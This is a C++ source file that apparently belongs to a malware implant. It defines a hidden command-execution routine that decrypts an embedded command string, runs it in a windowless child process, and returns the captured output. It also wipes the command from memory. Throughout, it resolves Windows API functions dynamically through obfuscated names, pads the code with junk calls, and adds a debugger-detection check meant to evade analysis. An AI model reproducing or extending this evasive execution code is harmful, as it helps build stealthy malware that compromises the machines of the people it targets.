#include <windows.h>
#include <iostream>
#include <string>
#include "winapi_function_signatures.h"
#include "winapi_obfuscation.h"
#include "junk_codes.h"
#include "byte_encryption.h"

namespace {
	std::string GetLastErrorAsString()
	{
		LPSTR messageBuffer = nullptr;
		DWORD errorMsgID = resolve_dynamically<GetLastError_t>(str_GetLastError)();

		// Ask Win32 to give us the string version of that message ID.
		size_t size = resolve_dynamically<FormatMessageA_t>(str_FormatMessageA)(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL, errorMsgID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

		// Copy the error message into a std::string.
		std::string message(messageBuffer, size);

		resolve_dynamically<LocalFree_t>(str_LocalFree)(messageBuffer);

		return message;
	}

	void createChildProc(HANDLE stdOutRead, HANDLE stdOutWrite, EncryptedBytes& cmd_string, std::string command)
	{
		PROCESS_INFORMATION procInfo;
		STARTUPINFOA startInfo;

		memset(&procInfo, 0, sizeof(procInfo));
		memset(&startInfo, 0, sizeof(startInfo));

		startInfo.cb = sizeof(STARTUPINFO);
		startInfo.hStdError = stdOutWrite;
		startInfo.hStdOutput = stdOutWrite;
		startInfo.hStdInput = stdOutRead;
		startInfo.dwFlags |= STARTF_USESTDHANDLES;

		int garbage = not_inlined_junk_func_3(0x64, 0, &junk_var_2);
		if (garbage % 5 == 0)
			junk();
		
		std::string cmdDecrypted = decrypt_string(cmd_string) + command;

		// Create the child process and run the command line (Wipe the command as soon as CreateProcessA() returns)
		bool result = resolve_dynamically<CreateProcessA_t>(str_CreateProcessA)(NULL, (char*)cmdDecrypted.c_str(), NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, &startInfo, &procInfo);
		wipeStr(cmdDecrypted);

		if (!result)
			throw std::runtime_error(GetLastErrorAsString());

		resolve_dynamically<CloseHandle_t>(str_CloseHandle)(procInfo.hProcess);
		resolve_dynamically<CloseHandle_t>(str_CloseHandle)(procInfo.hThread);
		resolve_dynamically<CloseHandle_t>(str_CloseHandle)(stdOutWrite);
	}
}

std::string exec(EncryptedBytes &cmd_string, std::string command)
{
	SECURITY_ATTRIBUTES securityAttr;

	HANDLE stdOutWrite = nullptr;
	HANDLE stdOutRead = nullptr;
	
	small_junk();

	memset(&securityAttr, 0, sizeof(securityAttr));
	securityAttr.nLength = sizeof(securityAttr);
	securityAttr.bInheritHandle = true;
	securityAttr.lpSecurityDescriptor = NULL;

	// Create an STDOUT Pipe for the child process
	bool result = resolve_dynamically<CreatePipe_t>(str_CreatePipe)(&stdOutRead, &stdOutWrite, &securityAttr, 0);
#ifdef _DEBUG
	if (!result) {
		return "Error - CreatePipe() failed: " + GetLastErrorAsString();
	}
#endif

	result = resolve_dynamically<SetHandleInformation_t>(str_SetHandleInformation)(stdOutRead, HANDLE_FLAG_INHERIT, 0);
#ifdef _DEBUG
	if (!result) {
		return "Error - SetHandleInformation() failed: " + GetLastErrorAsString();
	}
#endif 

	// Create the child process
	try {
		createChildProc(stdOutRead, stdOutWrite, cmd_string, command);
	}
	catch (const std::runtime_error& e) {
		return e.what();
	}
	
	// Read from the child process STDOUT Pipe
	DWORD bytesRead = 0;
	char buf[4096];
	std::string commandResult = "";

	memset(buf, 0, sizeof(buf));
	while (resolve_dynamically<ReadFile_t>(str_ReadFile)(stdOutRead, buf, sizeof(buf), &bytesRead, NULL) && bytesRead != 0) // while there are still bytes to read
		commandResult.append(buf, bytesRead);

	resolve_dynamically<CloseHandle_t>(str_CloseHandle)(stdOutRead);

	// Return the result from STDOUT
	return commandResult;
}

bool isDebuggerAttached() // the debugge just sees the breakpoint, and can choose to continue here or not (he can choose to bypass the `return true` or not) - not very efficient
{
	__try
	{
		__debugbreak();  // Trigger breakpoint exception
		return true;  // If this line runs, a debugger caught the exception
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return false;  // Exception caught by SEH - no debugger
	}
}